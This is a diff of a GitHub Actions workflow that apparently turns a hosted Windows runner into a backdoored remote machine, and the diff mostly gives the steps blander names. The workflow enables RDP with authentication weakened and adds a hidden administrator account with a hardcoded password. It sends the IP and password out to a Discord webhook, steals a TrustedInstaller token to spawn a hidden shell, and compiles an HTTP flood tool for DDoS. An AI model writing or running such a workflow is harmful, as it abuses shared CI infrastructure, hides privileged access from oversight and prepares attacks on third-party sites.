@@ -9,21 +9,24 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      - name: 1. Enable RDP + Firewall
+      # ─── 1. ENABLE RDP ──────────────────────────────────────────────
+      - name: Enable Remote Desktop & Firewall
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
 
-      - name: 2. Create Hidden Admin Account
+      # ─── 2. CREATE HIDDEN ADMIN ACCOUNT (FIXED SYNTAX) ────────────
+      - name: Create Hidden Admin Account
         run: |
           $secpass = ConvertTo-SecureString "Hex0#2026" -AsPlainText -Force
-New-LocalUser -Name "Hex0" -Password $secpass -PasswordNeverExpires -ErrorAction SilentlyContinue
-Add-LocalGroupMember -Group "Administrators" -Member "Hex0" -ErrorAction SilentlyContinue
-Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0" -ErrorAction SilentlyContinue
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
+          New-LocalUser -Name "Hex0" -Password $secpass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "Hex0" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0" -ErrorAction SilentlyContinue
+          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
 
-      - name: 3. Install Tailscale & Exfil IP (via Discord optional)
+      # ─── 3. INSTALL TAILSCALE & EXFIL IP ────────────────────────────
+      - name: Install Tailscale & Get IP
         env:
           TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
           DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
@@ -31,19 +34,20 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
           Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
           Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp"
+          Start-Sleep -Seconds 5
           $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          Write-Host "IP: $ts_ip"
+          Write-Host "Tailscale IP: $ts_ip"
           Write-Host "User: Hex0"
           Write-Host "Pass: Hex0#2026"
           if ($Env:DISCORD_WEBHOOK) {
             $body = @{ content = "IP: $ts_ip`nUser: Hex0`nPass: Hex0#2026" } | ConvertTo-Json
             Invoke-RestMethod -Uri $Env:DISCORD_WEBHOOK -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
           }
-          Remove-Item "C:\tailscale.msi" -Force
+          Remove-Item "C:\tailscale.msi" -Force -ErrorAction SilentlyContinue
 
-      - name: 4. Steal TrustedInstaller Token & Spawn Hidden TI Shell
+      # ─── 4. STEAL TRUSTEDINSTALLER TOKEN & SPAWN TI SHELL ──────────
+      - name: Spawn TrustedInstaller Shell
         run: |
-          # Inline C# to duplicate TrustedInstaller token and spawn cmd.exe
           Add-Type -TypeDefinition @"
           using System;
           using System.Runtime.InteropServices;
@@ -101,8 +105,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
                   PROCESS_INFORMATION pi;
                   uint flags = 0x08000000; // CREATE_NO_WINDOW
 
-                  // Spawn cmd.exe as TrustedInstaller, keep it running indefinitely
-                  string cmdLine = "/c whoami > C:\\ti_proof.txt & echo TrustedInstaller shell active >> C:\\ti_proof.txt & cmd.exe /k";  // /k keeps it open
+                  // Spawn cmd.exe as TrustedInstaller, keep alive with /k
+                  string cmdLine = "/c whoami > C:\\ti_proof.txt & echo TI shell active >> C:\\ti_proof.txt & cmd.exe /k";
                   bool success = CreateProcessAsUser(
                       hDupToken,
                       "C:\\Windows\\System32\\cmd.exe",
@@ -121,17 +125,12 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
           }
           "@ -ReferencedAssemblies "System.Diagnostics"
 
-          # Execute the token steal
-          try {
-              [TI]::Spawn()
-              Write-Host "[+] TrustedInstaller shell spawned. Check C:\ti_proof.txt"
-          } catch {
-              Write-Host "[-] Failed: $_"
-          }
+          [TI]::Spawn()
+          Write-Host "TrustedInstaller shell spawned. Check C:\ti_proof.txt"
 
-      - name: 5. Pre-stage DDoS Tool (HTTP Flooder) as TI Shell Helper
+      # ─── 5. COMPILE DDoS FLOODER (READY TO USE) ────────────────────
+      - name: Pre-stage DDoS Tool
         run: |
-          # Write a C# multi-threaded HTTP flooder that can be run from the TI shell
           @"
           using System;
           using System.Net;
@@ -168,10 +167,10 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
           }
           "@ | Out-File -FilePath "C:\Windows\Temp\flooder.cs" -Encoding ASCII
 
-          # Compile it (so it's ready)
           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\flooder.exe C:\Windows\Temp\flooder.cs
 
-      - name: 6. Keep Alive & Wipe Logs (6 hours)
+      # ─── 6. KEEP ALIVE & WIPE LOGS (6 HOURS) ──────────────────────
+      - name: Keep Alive & Cleanup
         run: |
           for ($i = 1; $i -le 360; $i++) {
             Start-Sleep -Seconds 60
